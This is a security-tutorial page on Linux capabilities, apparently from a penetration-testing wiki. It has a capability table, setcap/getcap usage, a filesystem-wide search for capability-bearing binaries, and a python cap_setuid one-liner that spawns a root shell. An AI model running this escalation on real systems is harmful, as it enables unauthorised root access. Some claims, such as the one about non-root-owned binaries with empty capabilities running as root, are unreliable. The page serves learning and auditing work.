# Linux Capabilities

## Capabilities

Normally the root user \(or any ID with UID of 0\) gets a special treatment when running processes. The kernel and applications are usually programmed to skip the restriction of some activities when seeing this user ID. In other words, this user is allowed to do \(almost\) anything.

Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.

### Why capabilities?

To better understand how Linux capabilities work, let’s have a look first at the problem it tries to solve.

Let’s assume we are running a process as a normal user. This means we are non-privileged. We can only access data that owned by us, our group, or which is marked for access by all users. At some point in time, our process needs a little bit more permissions to fulfill its duties, like opening a network socket. The problem is that normal users can not open a socket, as this requires root permissions.

### List Capabilities

```bash
#You list all the capabilities with
capsh --print
```

**Here you can find some capabilities with short descriptions**

| Capabilities name | Description |
| :--- | :--- |
| CAP\_AUDIT\_CONTROL | Allow to enable/disable kernel auditing |
| CAP\_AUDIT\_WRITE | Helps to write records to kernel auditing log |
| CAP\_BLOCK\_SUSPEND | This feature can block system suspends |
| **CAP\_CHOWN** | Allow user to make arbitrary change to files UIDs and GIDs \(full filesystem access\) |
| **CAP\_DAC\_OVERRIDE** | This helps to bypass file read, write and execute permission checks \(full filesystem access\) |
| **CAP\_DAC\_READ\_SEARCH** | This only bypass file and directory read/execute permission checks |
| CAP\_FOWNER | This enables to bypass permission checks on operations that normally require the filesystem UID of the process to match the UID of the file |
| CAP\_KILL | Allow the sending of signals to processes belonging to others |
| CAP\_SETGID | Allow changing of the GID |
| **CAP\_SETUID** | Allow changing of the UID \(set UID of root in you process\) |
| CAP\_SETPCAP | Helps to transferring and removal of current set to any PID |
| CAP\_IPC\_LOCK | This helps to lock memory |
| CAP\_MAC\_ADMIN | Allow MAC configuration or state changes |
| CAP\_NET\_RAW | Use RAW and PACKET sockets |
| CAP\_NET\_BIND\_SERVICE | SERVICE Bind a socket to internet domain privileged ports |
| CAP\_SYS\_CHROOT | Ability to call chroot\(\) |

Capabilities are useful when you want to restrict your own processes after performing privileged operations \(e.g. after setting up chroot and binding to a socket\). However, they can be exploited by passing them malicious commands or arguments which are then run as root.

You can force capabilities upon programs using `setcap`, and query these using `getcap`:

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

The `+ep` means you’re adding the capability \(“-” would remove it\) as Effective and Permitted.

To identify programs in a system or folder with capabilities:

```bash
getcap -r / 2>/dev/null
```

### Exploitation example

In the following example the binary `/usr/bin/python2.6` is found vulnerable to privesc:

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.6 = cap_setuid+ep

#Exploit
/usr/bin/python2.6 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** needed by `tcpdump` to allow any user to sniff packets:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### The special case of "empty" capabilities

Note that one can assign empty capability sets to a program file, and thus it is possible to create a set-user-ID-root program that changes the effective and saved set-user-ID of the process that executes the program to 0, but confers no capabilities to that process. Or, simply put, if you have a binary that:

1. is not owned by root
2. has no `SUID`/`SGID` bits set
3. has empty capabilities set \(e.g.: `getcap myelf` returns `myelf =ep`\)

then that binary will run as root.

Capabilities info was extracted from [here](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)

